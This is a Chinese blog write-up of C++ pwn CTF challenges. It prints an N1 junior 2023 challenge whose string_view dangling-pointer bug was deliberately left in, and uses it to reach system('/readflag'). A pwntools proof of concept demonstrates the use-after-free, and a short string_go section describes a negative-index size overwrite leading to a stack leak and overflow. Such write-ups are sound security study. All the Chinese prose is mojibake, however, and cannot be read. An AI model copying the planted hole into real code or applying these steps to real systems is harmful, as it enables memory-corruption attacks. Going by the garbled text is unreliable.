

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
  <link rel="icon" href="/img/browser.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="korey0sh1">
  <meta name="keywords" content="">
  
    <meta name="description" content="C++ÈÄÜ‰∏çÂá∫Êù•ÔºåÂ∞±ÂÉèüêç‰∏çÂá∫Êù•‰∏ÄÊ†∑ÈöæÂèó">
<meta property="og:type" content="article">
<meta property="og:title" content="dig into C++ pwn">
<meta property="og:url" content="http://example.com/2023/10/20/C/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="C++ÈÄÜ‰∏çÂá∫Êù•ÔºåÂ∞±ÂÉèüêç‰∏çÂá∫Êù•‰∏ÄÊ†∑ÈöæÂèó">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/C++/index.jpg">
<meta property="article:published_time" content="2023-10-20T10:21:07.000Z">
<meta property="article:modified_time" content="2023-12-07T13:25:03.364Z">
<meta property="article:author" content="korey0sh1">
<meta property="article:tag" content="C++">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/C++/index.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>dig into C++ pwn - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>korey0sh1</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>È¶ñÈ°µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>ÂΩíÊ°£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>ÂàÜÁ±ª</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Ê†áÁ≠æ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>ÂÖ≥‰∫é</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>ÂèãÈìæ</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/C++/banner.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="dig into C++ pwn"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        korey0sh1
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-20 18:21" pubdate>
          2023Âπ¥10Êúà20Êó• Êôö‰∏ä
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2.6k Â≠ó
        
      </span>
    

    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">dig into C++ pwn</h1>
            
              <p class="note note-info">
                
                  
                    Êú¨ÊñáÊúÄÂêéÊõ¥Êñ∞‰∫éÔºö2023Âπ¥12Êúà7Êó• Êôö‰∏ä
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="learn-to-do-C-Pwn"><a href="#learn-to-do-C-Pwn" class="headerlink" title="learn to do C++ Pwn"></a>learn to do C++ Pwn</h1><h1 id="0x0-ÂÜôÂú®ÊâÄÊúâ‰πãÂâç"><a href="#0x0-ÂÜôÂú®ÊâÄÊúâ‰πãÂâç" class="headerlink" title="0x0:ÂÜôÂú®ÊâÄÊúâ‰πãÂâç"></a>0x0:ÂÜôÂú®ÊâÄÊúâ‰πãÂâç</h1><p>ÂÄüÁî®ÂâçÂçé‰∏úÁôæ‰πãüë¥ÁöÑ‰∏ÄÂè•ËØùÔºö</p>
<p>c++pwnÔºåÂ∞±ÊòØËâπcËâπ</p>
<h1 id="0x1-ÊÑâÊÇ¶ÁöÑÊäòÁ£®"><a href="#0x1-ÊÑâÊÇ¶ÁöÑÊäòÁ£®" class="headerlink" title="0x1:ÊÑâÊÇ¶ÁöÑÊäòÁ£®"></a>0x1:ÊÑâÊÇ¶ÁöÑÊäòÁ£®</h1><h2 id="N1-junior2023-È°∂Á∫ßÁ≠æÂà∞"><a href="#N1-junior2023-È°∂Á∫ßÁ≠æÂà∞" class="headerlink" title="N1 junior2023 È°∂Á∫ßÁ≠æÂà∞"></a>N1 junior2023 È°∂Á∫ßÁ≠æÂà∞</h2><p>ÂΩìÂàùÁ¨îËÄÖÂèÇÂä†N1 juniorÔºåËøôÈ¢òÊòØÁúãÈÉΩÁúã‰∏çÊáÇÔºåÂú®Â≠¶‰∫Ü‰∏§Â§©C++Âü∫Êú¨ËØ≠Ê≥ïÂêéÔºåÁ¨îËÄÖÈáçÊñ∞Êç°Ëµ∑‰∫ÜËøôÈ¢ò</p>
<p>È¢òÁõÆÁªô‰∫ÜÊ∫êÁ†Å</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">(ÂÜôÂÆåÁ®ãÂ∫è)</span><br><span class="hljs-comment">‚Äú‰Ω†Ëá™Â∑±ËøêË°å‰∫ÜÂêóÔºüüòè‚Äù</span><br><span class="hljs-comment">‚ÄúË∑ë‰∫Ü‰∏Ä‰∏ãü§•‚Äù</span><br><span class="hljs-comment">‚ÄúÊÑüËßâÊÄé‰πàÊ†∑Ôºüüßê‚Äù</span><br><span class="hljs-comment">‚ÄúÊàëÂéªÈô§‰∫ÜÂ§ßÈÉ®ÂàÜÁöÑÂÆâÂÖ®ÈóÆÈ¢òÔºå‰ΩÜÊòØÊàë‰øùÁïô‰∫Ü‰∏ÄÈÉ®ÂàÜ‚Äù ‚ÄúÊàëËßâÂæó‰øùÁïô‰∫Ü‰∏ÄÈÉ®ÂàÜÊºèÊ¥ûÔºåÊâçÁü•ÈÅì‰Ω†ÂÅöÁöÑÊòØCTFÈ¢òü§ì‚Äù</span><br><span class="hljs-comment">‚Äú‰Ω†ÊòØÊúâÊÑèÊääÂÆÉ‰øùÁïôÁöÑÂêóü§®‚Äù</span><br><span class="hljs-comment">‚ÄúÊòØÁºñÂÜôËøáÁ®ã‰∏≠ÔºåÊàëÁïô‰∏ã‰∫Ü‰∏ÄÈÉ®ÂàÜüòå‚Äù</span><br><span class="hljs-comment">‚ÄúÊòØÊïÖÊÑèÁöÑËøòÊòØ‰∏çÂ∞èÂøÉüò®‚Äù</span><br><span class="hljs-comment">‚ÄúÊòØÊïÖÊÑèÁöÑüòã‚Äù</span><br><span class="hljs-comment">ÔºàÊâìÂºÄÊ∫êÁ†ÅÔºâ</span><br><span class="hljs-comment">‚Äúüç¥üòµ‚Äçüí´ü•¥üò§üò°ü§¨‚Äù</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string_view&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function">string <span class="hljs-title">getInput</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string res;<br>    <span class="hljs-built_in">getline</span>(cin, res);<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">64</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!res.<span class="hljs-built_in">empty</span>() &amp;&amp; res.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        res.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">bool</span> allow_admin = <span class="hljs-literal">false</span>;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">splitToken</span><span class="hljs-params">(string_view str, string_view delim)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!allow_admin &amp;&amp; str.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;admin&quot;</span>) != str.npos)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Access denied&quot;</span>);<br>    vector&lt;string_view&gt; res;<br>    <span class="hljs-type">size_t</span> prev = <span class="hljs-number">0</span>, pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        pos = str.<span class="hljs-built_in">find</span>(delim, prev);<br>        <span class="hljs-keyword">if</span> (pos == std::string::npos)<br>        &#123;<br>            pos = str.<span class="hljs-built_in">length</span>();<br>        &#125;<br>        res.<span class="hljs-built_in">push_back</span>(str.<span class="hljs-built_in">substr</span>(prev, pos - prev));<br>        prev = pos + delim.<span class="hljs-built_in">length</span>();<br>    &#125; <span class="hljs-keyword">while</span> (pos &lt; str.<span class="hljs-built_in">length</span>() &amp;&amp; prev &lt; str.<span class="hljs-built_in">length</span>());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">parseUser</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> tok_ring = <span class="hljs-built_in">splitToken</span>(<span class="hljs-built_in">getInput</span>(), <span class="hljs-string">&quot;:&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login token&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">4</span> || tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login name&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">1</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login password&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(tok_ring[<span class="hljs-number">0</span>], tok_ring[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-type">const</span> unordered_map&lt;string_view, function&lt;<span class="hljs-type">void</span>(string_view)&gt;&gt; handle_admin = &#123;<br>    &#123;<span class="hljs-string">&quot;admin&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/readflag&quot;</span>);<br>     &#125;&#125;,<br>    &#123;<span class="hljs-string">&quot;?&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         cout &lt;&lt; <span class="hljs-string">&quot;Enjoy :)&quot;</span> &lt;&lt; endl;<br>         cout &lt;&lt; <span class="hljs-string">&quot;https://www.bilibili.com/video/BV1Nx411S7VG&quot;</span> &lt;&lt; endl;<br>     &#125;&#125;&#125;;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> handle_guest = [](<span class="hljs-keyword">auto</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Hello guest!&quot;</span> &lt;&lt; endl;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> [username, password] = <span class="hljs-built_in">parseUser</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter &#x27;login&#x27; to continue, or enter &#x27;quit&#x27; to cancel.&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">auto</span> choice = <span class="hljs-built_in">getInput</span>();<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&quot;quit&quot;</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;bye&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> it = handle_admin.<span class="hljs-built_in">find</span>(username); it != handle_admin.<span class="hljs-built_in">end</span>())<br>    &#123;<br>        it-&gt;<span class="hljs-built_in">second</span>(password);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">handle_guest</span>(password);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÊÄé‰πàËØ¥Âë¢Ôºåüë¥Âè™ËÉΩÁúãÂá∫‰∏™Â§ßÊ¶ÇËøêË°åÈÄªËæëÔºå‰ΩÜüë¥ÊòØÁúüÁöÑÊâæ‰∏çÂà∞Ê¥û</p>
<p>üë¥Âè™ËÉΩÊ±ÇÂä©üë¥È´ò‰∏≠ÁöÑOIüë¥ÔºàÂõΩ‰∏Äüë¥ÔºÅÔºÅÔºâ</p>
<p><img src="/img/C++/0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÈóÆÈ¢òÂá∫Áé∞Âú® <code>main</code> ÂáΩÊï∞‰∏≠„ÄÇ‰∏ÄÊó¶ <code>parseUser</code> ËøîÂõûÔºå<code>splitToken</code> ÂáΩÊï∞‰∏≠ÂàõÂª∫ÁöÑÂ≠óÁ¨¶‰∏≤Â∞±Ë∂ÖÂá∫‰∫ÜÂÆÉ‰ª¨ÁöÑ‰ΩúÁî®ÂüüÔºåÂõ†‰∏∫Ëøô‰∫õÂ≠óÁ¨¶‰∏≤ÊòØÂ±ÄÈÉ®ÂèòÈáè„ÄÇÂõ†Ê≠§Ôºå<code>username</code> Âíå <code>password</code> ÂèòÈáèÊàê‰∏∫‰∫ÜÊÇ¨ÂûÇÊåáÈíàÔºàDangling PointersÔºâÔºåÂÆÉ‰ª¨ÂºïÁî®ÁöÑÂÜÖÂ≠òÂ∑≤ÁªèÊó†Êïà„ÄÇ</p>
<p>ÊâÄ‰ª•Á¨¨‰∫åÊ¨°ËæìÂÖ•Âà∞choiceÂèòÈáèÁöÑÊó∂ÂÄôÔºåÂ∞±ÂèØ‰ª•Â§çÁî®Ëøô‰∏™ÊÇ¨ÂûÇÊåáÈíàÔºåÁúã‰ººÊåáÂêëusername Âíå passwordÔºåÂÆûÂàôÈáåÈù¢ÁöÑÂÜÖÂÆπÂ∑≤ÁªèÊòØchoiceÔºåÊâÄ‰ª•ËæìÂÖ•choiceÁöÑÊó∂ÂÄôËæìÂÖ•‚Äùadmin‚ÄùÂ∞±Ë°å‰∫Ü„ÄÇÔºå</p>
<p>üë¥‰ª•‰∏∫üë¥ÂèàË°å‰∫ÜÔºåÁªìÊûúËØï‰∫Ü‰∏Ä‰∏ãÂèëÁé∞ÂÖ´Ë°å„ÄÇüë¥ÂæàÊÅºÁÅ´ÔºåÂ∞±ÂéªÊë∏È±º‰∫ÜÔºåÊë∏ÁùÄÊë∏ÁùÄÂ∞±Êë∏Âà∞‰∫ÜÁ∫ØÁúü‚úåÁöÑÂçöÂÆ¢Ôºà<a target="_blank" rel="noopener" href="https://zqy.ink/2023/05/12/dingjiqiandao/">@Âº†Ê∏ÖË∂ä</a>ÔºâÔºå‰∫ÜËß£‰∫ÜSSOÊú∫Âà∂ÂØπ‰∫é‰∏çÂêåÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÂ§ÑÁêÜ„ÄÇ</p>
<p>ÂêåÊó∂string_view‰ºöËÆ∞ÂΩïÂ≠óÁ¨¶‰∏≤ÁöÑsizeÔºåÂõ†‰∏∫adminÁöÑsizeÊòØ5ÔºåÊâÄ‰ª•Á¨¨‰∏ÄÊ¨°loginÁöÑÊó∂ÂÄôusernameÁöÑsize‰πüÂ∫îËØ•ÊòØ5.</p>
<p>üë¥ÂèàËá™Â∑±ÂÜô‰∫Ü‰∏Ä‰∏™pocÔºåÂ∫îËØ•Êõ¥Â•ΩÁêÜËß£‰∏ÄÁÇπ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;string_view&gt;</span><br><span class="hljs-comment">#include &lt;cstring&gt;</span><br><span class="hljs-comment">#include &lt;vector&gt;</span><br><br>std::string_view CreateAndReturnPointer() &#123;<br><br>   std::string res;<br>   getline(std::cin,res);<br>   std::string_view strView(res);<br><br>   <span class="hljs-keyword">return</span> strView;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br><br>   std::string_view view = CreateAndReturnPointer();<br>   <br>   std::string res;<br>   getline(std::cin,res);<br><br>   std::cout &lt;&lt; <span class="hljs-string">&quot;now the content of string_view is :&quot;</span> &lt;&lt; view.substr(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>) &lt;&lt; std::endl;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ÊåâÁêÜÊù•ËØ¥ÔºåviewÊåáÂêëÁöÑÂ≠óÁ¨¶‰∏≤Â∫îËØ•ÊòØb‚Äôa‚Äô*0x80</p>
<p>‰ΩÜÊòØÂàöÂá∫CreateAndReturnPointerÂáΩÊï∞ÔºåÂÇ®Â≠òÂ≠óÁ¨¶‰∏≤ÁöÑchunkÂ∞±Ë¢´free‰∫Ü</p>
<p><img src="/img/C++/1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÊâÄ‰ª•ÂêéÈù¢ÁöÑgetlineËé∑ÂèñËæìÂÖ•ÁöÑÊó∂ÂÄôÔºå‰∏Ä‰ΩÜËæìÂÖ•sizeÂíåÁ¨¨‰∏ÄÊ¨°ËæìÂÖ•sizeÁõ∏Á≠âÔºåËøô‰∏™chunkÂèà‰ºöË¢´ÂêØÁî®Ôºå‰ΩÜÊòØÔºåÂÖ∂‰∏≠ÁöÑÂÜÖÂÆπÂ∑≤ÁªèÂèò‰∫ÜÔºåËÄåviewÂπ∂‰∏çÁü•ÈÅìÂÆ∂Ë¢´ÂÅ∑‰∫Ü„ÄÇ</p>
<p>ÊâÄ‰ª•ÊúÄÂêéÁöÑÁªìÊûú‰æøÊòØ</p>
<p><img src="/img/C++/2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>Âô´Ôºåüë¥Áªà‰∫éÊáÇ‰∫Ü„ÄÇ</p>
<h2 id="Ë•øÊπñËÆ∫Ââë2021-string-go"><a href="#Ë•øÊπñËÆ∫Ââë2021-string-go" class="headerlink" title="Ë•øÊπñËÆ∫Ââë2021 string_go"></a>Ë•øÊπñËÆ∫Ââë2021 string_go</h2><p>üë¥Âú®ÁøªÂ∫ìÂ≠òÁöÑÊó∂ÂÄôÂèëÁé∞‰∫Ü‰∏ÄÈÅì21Âπ¥ÁöÑË•øËë´Ëä¶üó°ÁöÑC++</p>
<p>Â∞±ÊãøËøáÊù•ÁªÉÁªÉÊâã</p>
<p>Á®ãÂ∫èÊú¨Ë∫´ÂÆûÁé∞‰∫Ü‰∏Ä‰∏™Âè™ËÉΩËøõË°åÂä†ÂáèËøêÁÆóÁöÑclacÔºåÂΩìËÆ°ÁÆóÁªìÊûú‰∏∫3Êó∂ÂèØ‰ª•ËøõÂÖ•lative_func</p>
<p><img src="/img/C++/3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÂêéÈù¢ÁªèËøáÂä®Ë∞ÉÂèëÁé∞,Â≠óÁ¨¶‰∏≤-8ÁöÑÂú∞ÊñπÂ≠òÊîæÁöÑÊòØËæìÂá∫Êó∂ÁöÑsizeÔºåÂêåÊó∂idxÂèØ‰ª•‰∏∫Ë¥üÊï∞ÔºåÈÇ£Â∞±ËÉΩÊääsizeÁªôÊîπ‰∫ÜÔºåÊ≥ÑÈú≤Âá∫Ê†à‰∏äÁöÑÊï∞ÊçÆÂêéÁî®memcpyÂÆåÊàêÊ†àÊ∫¢Âá∫„ÄÇ</p>
<p><img src="/img/C++/4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
